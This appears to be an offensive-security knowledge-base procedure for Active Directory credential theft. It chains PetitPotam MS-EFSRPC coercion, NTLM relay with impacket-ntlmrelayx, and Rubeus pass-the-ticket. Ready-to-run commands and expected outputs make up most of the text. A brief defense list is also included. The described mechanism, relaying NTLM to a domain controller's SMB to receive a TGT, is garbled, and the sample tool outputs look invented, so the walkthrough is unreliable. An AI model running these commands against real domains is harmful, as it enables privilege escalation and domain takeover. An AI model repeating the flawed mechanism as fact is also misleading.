---
id: 2eb9b16a-0060-4194-b911-6006b2f1b1c5
name: MS-EFSRPC-Abuse-via-PetitPotam-and-Unconstrained-Delegation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:07.628312+00:00'
updated_at: '2023-04-10T20:36:05.360985+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Abuse Elevation Control Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
  - '[[techniques/Unsecured Credentials|T1552 - Unsecured Credentials]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Kerberos Unconstrained Delegation]]'
  - '[[tags/MS-EFSRPC Abuse with Unconstrained Delegation]]'
commands:
  - '[[commands/powerview-get-unconstrained-accounts]]'
  - '[[commands/git-clone-petitpotam]]'
  - '[[commands/ntlmrelayx-ntlm-relay-for-tgt]]'
  - '[[commands/python-petitpotam-coerce]]'
  - '[[commands/rubeus-ask-tgs-ptt]]'
platforms:
  - Windows
tools:
  - '[[tools/PetitPotam]]'
  - '[[tools/Rubeus]]'
  - '[[tools/Impacket]]'
validated: true
---

# MS-EFSRPC Abuse via PetitPotam and Unconstrained Delegation

## Summary

This procedure demonstrates how to abuse the MS-EFSRPC protocol in conjunction with Kerberos unconstrained delegation using the PetitPotam tool to coerce a target Active Directory Certificate Services (AD CS) server to authenticate to an attacker-controlled server. By relaying the authentication, an attacker can extract a Ticket Granting Ticket (TGT) for the target account, enabling privilege escalation, credential access, and potential domain compromise.

## Description

The MS-EFSRPC protocol allows remote management of Encrypting File System (EFS) keys but can be abused to force authentication from a target server, such as an AD CS server, to an attacker-specified endpoint. When combined with Kerberos unconstrained delegation (enabled via the TRUSTED_FOR_DELEGATION userAccountControl flag on the target account), the coerced NTLM authentication can be relayed to a domain controller to obtain the target's TGT. This TGT can then be injected for impersonation, allowing access to sensitive resources like certificate issuance. The attack requires the target to expose the EFSRPC endpoint (typically via RPC over named pipes) and have unconstrained delegation enabled. It is commonly used against Windows domain environments with misconfigured AD CS servers. Success depends on network access to the target and a running relay server to capture and process the authentication.

## Requirements

1. Domain credentials or anonymous access to initiate coercion (authenticated coercion may be needed if anonymous is blocked).
2. Network access to the target's RPC endpoint (port 445 for SMB, port 135 for RPC).
3. The target account (e.g., AD CS machine account) must have Kerberos unconstrained delegation enabled.
4. Attacker machine with Python 3, Impacket, and Rubeus installed.
5. A domain controller IP or hostname for relaying authentication to extract the TGT.

## Defense

- Disable unconstrained delegation on sensitive accounts like AD CS servers unless absolutely required; use resource-based constrained delegation instead.
- Implement network segmentation to block unauthorized RPC and SMB traffic to/from AD CS servers.
- Monitor for anomalous authentication patterns, such as unexpected NTLM authentications from servers to non-standard endpoints (Event IDs 4624, 4672 with Type 3 messages).
- Enable Protected Users group or restrict delegation for high-privilege accounts.
- Use tools like Microsoft Defender for Identity to detect coercion attempts and unusual relay activity.

## Objectives

1. Coerce the target server to authenticate to the attacker-controlled relay, capturing NTLM credentials.
2. Relay the authentication to extract the target's Kerberos TGT.
3. Inject the TGT to impersonate the target account and access restricted resources, such as requesting certificates.
4. Achieve privilege escalation within the Active Directory environment.

## Instructions

### Step 1: Verify Unconstrained Delegation on Target Account

**Context**: Before attempting the coercion, confirm that the target account (e.g., the AD CS computer account) has Kerberos unconstrained delegation enabled. This is a prerequisite for extracting the TGT via relay. Use PowerView on a compromised domain-joined machine with domain creds.

**Command** ([[commands/powerview-get-unconstrained-accounts]]):
```powershell
Get-DomainComputer -Unconstrained | Select samaccountname, distinguishedname
```

> This command queries Active Directory for computer accounts with the unconstrained delegation flag set. Look for the target AD CS server in the output. If not present, the attack may fail or require alternative delegation abuse.

**Expected Output**: A list of accounts like:

samaccountname DistinguishedName
-------------- ----------------
ADCS-SERVER   CN=ADCS-SERVER,CN=Computers,DC=domain,DC=com

### Step 2: Clone PetitPotam Repository

**Context**: Download the PetitPotam tool, which implements the MS-EFSRPC coercion. This step prepares the attacker's machine with the necessary Python scripts.

**Command** ([[commands/git-clone-petitpotam]]):
```bash
git clone https://github.com/topotam/PetitPotam
```

> Run this in a directory with write access. The repository contains the Python scripts for coercion. No authentication is required for cloning.

**Expected Output**: Cloning progress and confirmation:

Cloning into 'PetitPotam'...
remote: Enumerating objects: 20, done.
remote: Total 20 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (20/20), done.

### Step 3: Start NTLM Relay Server for TGT Extraction

**Context**: Set up an NTLM relay server using Impacket to intercept the coerced authentication and relay it to the domain controller's SMB share. This exploits unconstrained delegation to obtain the base64-encoded TGT in the relay response. Run this before coercion and on the $ATTACKER_IP.

**Command** ([[commands/ntlmrelayx-ntlm-relay-for-tgt]]):
```bash
impacket-ntlmrelayx -smb2support -t smb://$_TARGET_DC
```

> The relay listens on SMB (port 445) for incoming authentications from the target. The -t option specifies the relay target (DC's SMB). With unconstrained delegation, the DC will include the TGT in the response. Monitor the output for base64 tickets. Stop the relay after coercion.

**Expected Output**: Relay server startup and success on authentication:

Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

[*] Protocol Client ntlmrelayx loaded...
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up HTTP Server
[*] Servers started, waiting for connections

(When target authenticates) 
[*] SMB - Received connection from TARGET_IP, attacking it!
[*] ... (relay details)
[*] Saved TGT for user MACHINE$ to /path/to/tgt.ccache (base64: <ticket base64>)

### Step 4: Coerce Authentication with PetitPotam

**Context**: Use PetitPotam to force the target AD CS server to authenticate to the attacker's relay server via MS-EFSRPC. This can be done anonymously or with credentials. Ensure the relay from Step 3 is running. The target IP is the AD CS server.

**Command** ([[commands/python-petitpotam-coerce]]):
```bash
python3 petitpotam.py -d $_DOMAIN -u $_USER -p $_PASSWORD $_ATTACKER_IP $_TARGET_IP
```

> For anonymous coercion, omit -u and -p or use empty values: python3 petitpotam.py -d $_DOMAIN '' '' $_ATTACKER_IP $_TARGET_IP. Run from the cloned PetitPotam directory. This sends an RPC request to the target's EFSRPC endpoint, coercing an SMB connection to $ATTACKER_IP. The relay in Step 3 captures and processes it to extract the TGT.

**Expected Output**: Coercion success:

[*] Target: $_TARGET_IP
[*] Domain: $_DOMAIN
[*] Username: $_USER
[*] Password: $_PASSWORD
[*] Attacker IP: $_ATTACKER_IP
[*] Sending EFSRPC request...
[*] Coercion successful - target should authenticate to attacker IP.

Check the relay output for the captured TGT base64.

### Step 5: Inject Extracted TGT with Rubeus

**Context**: Use the base64 TGT obtained from the relay output to request a Ticket Granting Service (TGS) ticket and pass-the-ticket (PTT) it into the current session for impersonation. Run this on a Windows attacker machine with Rubeus.exe in the path.

**Command** ([[commands/rubeus-ask-tgs-ptt]]):
```cmd
.\Rubeus.exe asktgs /ticket:$_TICKET_BASE64 /ptt
```

> Replace $_TICKET_BASE64 with the base64 string from the relay. This requests a TGS (default to CIFS or current context) using the TGT and injects it. Success allows impersonation of the target account.

**Expected Output**: Ticket injection success:

[*] Action: AskTGS
[*] Ticket: <base64>

[*] Requesting TGS ticket to SPN: *

[*] TGS ticket successfully exported!

[*] Ticket successfully imported!

> Impersonation active - use tools like klist to verify.
